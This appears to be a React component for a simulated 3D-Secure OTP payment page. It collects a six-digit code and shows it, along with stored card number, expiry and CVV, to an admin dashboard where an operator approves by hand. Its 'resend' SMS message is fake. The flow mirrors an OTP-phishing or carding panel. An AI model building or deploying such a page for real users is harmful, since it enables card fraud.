import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { motion } from 'motion/react';
import { Lock, ShieldAlert, CheckCircle2, ArrowRight, RefreshCw, KeyRound, AlertCircle } from 'lucide-react';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: string;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
}

export function OTPPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const tx = location.state?.tx as Transaction | undefined;

  const [otp, setOtp] = useState<string[]>(Array(6).fill(''));
  const [error, setError] = useState<string | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [otpStatus, setOtpStatus] = useState<'editing' | 'submitted' | 'approved' | 'rejected'>('editing');
  const [timer, setTimer] = useState(90); // 1 min 30 seconds countdown
  const [resendCooldown, setResendCooldown] = useState(false);
  const [notification, setNotification] = useState<string | null>(null);

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // If no transaction context is found in location state, send home
  useEffect(() => {
    if (!tx) {
      navigate('/');
    }
  }, [tx, navigate]);

  // Countdown timer for security code validity
  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  // Poll transaction status once OTP is submitted
  useEffect(() => {
    if (otpStatus !== 'submitted' || !tx || !tx.id) return;

    let isMounted = true;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/status/${tx.id}`);
        if (!res.ok) throw new Error('Could not check status');
        const updatedTx = await res.json();

        if (isMounted) {
          if (updatedTx.status === 'APPROVED') {
            clearInterval(interval);
            setOtpStatus('approved');
            setIsVerified(true);
            setTimeout(() => {
              navigate('/success', { state: { tx: updatedTx } });
            }, 1000);
          } else if (updatedTx.status === 'REJECTED') {
            clearInterval(interval);
            setOtpStatus('rejected');
            setError('Transaction declined during administrative verification. Contact your issuer.');
          }
        }
      } catch (err) {
        console.error('Polling error:', err);
      }
    }, 2000);

    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [otpStatus, tx, navigate]);

  // Format countdown text helper (e.g. "01:24")
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Focus the first input box on load
  useEffect(() => {
    if (inputRefs.current[0]) {
      inputRefs.current[0].focus();
    }
  }, []);

  // Handle digit input keystroke
  const handleChange = (element: HTMLInputElement, index: number) => {
    const val = element.value;
    if (isNaN(Number(val))) return; // Digits only

    const newOtp = [...otp];
    newOtp[index] = val.slice(-1); // Only keep the last digit typed
    setOtp(newOtp);
    setError(null);

    // Auto focus next input box
    if (val !== '' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  // Handle keyboard navigation (backspace, arrow keys)
  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === 'Backspace') {
      if (otp[index] === '' && index > 0) {
        // Move focus back if currently empty
        const newOtp = [...otp];
        newOtp[index - 1] = '';
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      } else {
        // Clear current box value
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      }
    }
  };

  // Handle pasting code e.g. "123456"
  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').trim();
    if (!/^\d+$/.test(pastedData)) return; // Only allow digits

    const digits = pastedData.slice(0, 6).split('');
    const newOtp = [...otp];
    
    digits.forEach((digit, idx) => {
      if (idx < 6) {
        newOtp[idx] = digit;
      }
    });

    setOtp(newOtp);
    setError(null);

    // Focus last pasted index or submit button
    const focusIndex = Math.min(digits.length - 1, 5);
    inputRefs.current[focusIndex]?.focus();
  };

  // Handle OTP submission validation
  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = otp.join('');

    if (code.length < 6) {
      setError('Please enter all 6 digits of the security verification code.');
      return;
    }

    setIsVerifying(true);
    setError(null);

    try {
      const res = await fetch('/api/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: tx.id, otp: code }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setIsVerifying(false);
        setOtpStatus('submitted');
      } else {
        setError(data.error || 'Incorrect security verification code. Please try again.');
        setIsVerifying(false);
      }
    } catch (err) {
      console.error(err);
      setError('An error occurred during verification. Please try again.');
      setIsVerifying(false);
    }
  };

  // Trigger resend mock SMS code
  const handleResend = () => {
    if (resendCooldown) return;
    
    setResendCooldown(true);
    setTimer(90); // Reset timer
    setOtp(Array(6).fill('')); // Clear inputs
    setError(null);
    setNotification('A fresh secure 6-digit passcode has been dispatched to your registered phone.');

    // Focus first input
    setTimeout(() => {
      inputRefs.current[0]?.focus();
    }, 100);

    // Clear notification after 4 seconds
    setTimeout(() => {
      setNotification(null);
    }, 4000);

    // Cooldown resend for 10 seconds
    setTimeout(() => {
      setResendCooldown(false);
    }, 10000);
  };

  if (!tx) return null;

  return (
    <div id="otp-container" className="mx-auto max-w-md px-4 py-16 flex flex-col items-center justify-center min-h-[70vh]">
      <motion.div
        initial={{ opacity: 0, y: 15 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full rounded-3xl border border-slate-800 bg-slate-900/40 p-8 backdrop-blur-xl shadow-2xl shadow-indigo-950/20"
      >
        {otpStatus === 'submitted' ? (
          <div className="space-y-6 text-center py-6">
            <div className="relative flex items-center justify-center h-20 w-20 mx-auto mb-4">
              <div className="absolute inset-0 rounded-full border border-indigo-500/10 animate-ping" />
              <div className="absolute inset-2 rounded-full border border-t-indigo-400 border-r-indigo-500/0 border-b-indigo-500/0 border-l-indigo-400/20 animate-spin" style={{ animationDuration: '2s' }} />
              <RefreshCw className="h-6 w-6 text-indigo-400 animate-spin" />
            </div>
            
            <h3 className="text-xl font-bold text-white tracking-tight">Verifying Security Code...</h3>
            <p className="text-xs text-slate-300 leading-relaxed max-w-xs mx-auto">
              Your security passcode <strong className="text-indigo-400 font-mono text-sm tracking-wider">{otp.join('')}</strong> has been transmitted to the bank secure audit ledger.
            </p>
            <p className="text-xs text-amber-400 font-mono font-semibold animate-pulse flex items-center justify-center space-x-1">
              <span>●</span>
              <span>WAITING FOR BANK FINAL SETTLEMENT...</span>
            </p>
            
            <div className="rounded-2xl bg-indigo-500/5 border border-indigo-500/10 p-5 text-left text-[11px] font-mono text-slate-400 space-y-1.5">
              <p className="font-bold text-indigo-400 flex items-center space-x-1.5 mb-2">
                <ShieldAlert className="h-3.5 w-3.5" />
                <span>SANDBOX SIMULATOR STEP 2:</span>
              </p>
              <p>1. Keep this transaction page open.</p>
              <p>2. Toggle back to the <strong className="text-indigo-300">Admin Dashboard Ledger</strong> tab.</p>
              <p>3. Notice that transaction <strong className="text-indigo-300">{tx.id}</strong> is now in <strong className="text-indigo-400">OTP_SUBMITTED</strong> state, showing your code <strong className="text-emerald-400">{otp.join('')}</strong>.</p>
              <p>4. Click <strong className="text-emerald-400">FINAL APPROVE</strong> to settle, or <strong className="text-rose-400">REJECT</strong> to fail.</p>
            </div>
          </div>
        ) : (
          <>
            <div className="text-center mb-6">
              <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 mb-4">
                <KeyRound className="h-6 w-6" />
              </div>
              <h2 className="text-2xl font-bold text-white tracking-tight">Two-Factor Authentication</h2>
              <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                We sent a secure One-Time Password (OTP) to your registered mobile number associated with your card ending in <strong className="text-white">{tx.cardNumber.slice(-4)}</strong>.
              </p>
            </div>

            {/* Verification Notification Banner */}
            {notification && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                className="mb-4 rounded-xl bg-emerald-500/10 border border-emerald-500/20 p-3 text-[11px] text-emerald-400 font-medium"
              >
                {notification}
              </motion.div>
            )}

            <form onSubmit={handleVerify} className="space-y-6">
              {/* Split 6-digit box layout */}
              <div className="flex justify-between gap-2 max-w-sm mx-auto" dir="ltr">
                {otp.map((digit, idx) => (
                  <input
                    key={idx}
                    type="text"
                    pattern="[0-9]*"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    ref={(el) => (inputRefs.current[idx] = el)}
                    onChange={(e) => handleChange(e.target, idx)}
                    onKeyDown={(e) => handleKeyDown(e, idx)}
                    onPaste={idx === 0 ? handlePaste : undefined}
                    disabled={isVerifying || isVerified}
                    className="w-12 h-14 text-center text-xl font-bold font-mono rounded-xl border border-slate-800 bg-slate-950 text-white focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all duration-150 disabled:opacity-50"
                  />
                ))}
              </div>

              {error && (
                <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center space-x-2 animate-pulse">
                  <AlertCircle className="h-4 w-4 shrink-0" />
                  <span>{error}</span>
                </div>
              )}

              {/* Code expiration and resend details */}
              <div className="flex justify-between items-center text-xs font-mono text-slate-400 px-1">
                <span>
                  {timer > 0 ? (
                    <span className="flex items-center space-x-1">
                      <span>Expires in:</span>
                      <span className="text-amber-400 font-bold">{formatTime(timer)}</span>
                    </span>
                  ) : (
                    <span className="text-rose-400 font-bold">Code Expired</span>
                  )}
                </span>
                
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={resendCooldown}
                  className={`font-semibold underline transition ${
                    resendCooldown ? 'text-slate-600 cursor-not-allowed' : 'text-indigo-400 hover:text-indigo-300'
                  }`}
                >
                  {resendCooldown ? 'Resending...' : 'Resend Code'}
                </button>
              </div>

              {/* Submit Action Button */}
              <button
                type="submit"
                disabled={isVerifying || isVerified}
                className={`w-full h-12 rounded-xl flex items-center justify-center space-x-2 text-xs font-bold tracking-wider transition-all duration-300 shadow-lg ${
                  isVerified
                    ? 'bg-emerald-500 text-slate-950 shadow-emerald-500/10'
                    : 'bg-indigo-600 hover:bg-indigo-500 text-white hover:shadow-indigo-500/20'
                }`}
              >
                {isVerifying ? (
                  <>
                    <RefreshCw className="h-4 w-4 animate-spin" />
                    <span>AUTHENTICATING SECURE LOCK...</span>
                  </>
                ) : isVerified ? (
                  <>
                    <CheckCircle2 className="h-4 w-4" />
                    <span>CODE CONFIRMED!</span>
                  </>
                ) : (
                  <>
                    <span>VERIFY AND PAY</span>
                    <ArrowRight className="h-4 w-4" />
                  </>
                )}
              </button>
            </form>

            {/* Info/Simulator Box */}
            <div className="mt-8 pt-6 border-t border-slate-800 text-center text-[11px] font-mono text-slate-500 space-y-1">
              <p className="flex items-center justify-center space-x-1.5 text-indigo-400/90 font-bold">
                <Lock className="h-3 w-3" />
                <span>SECURE 3D-SECURE GATEWAY</span>
              </p>
              <p>
                💡 Sandbox Simulator Tip: Enter any 6-digit passcode (such as <strong className="text-slate-300">123456</strong>) to authenticate.
              </p>
            </div>
          </>
        )}
      </motion.div>
    </div>
  );
}
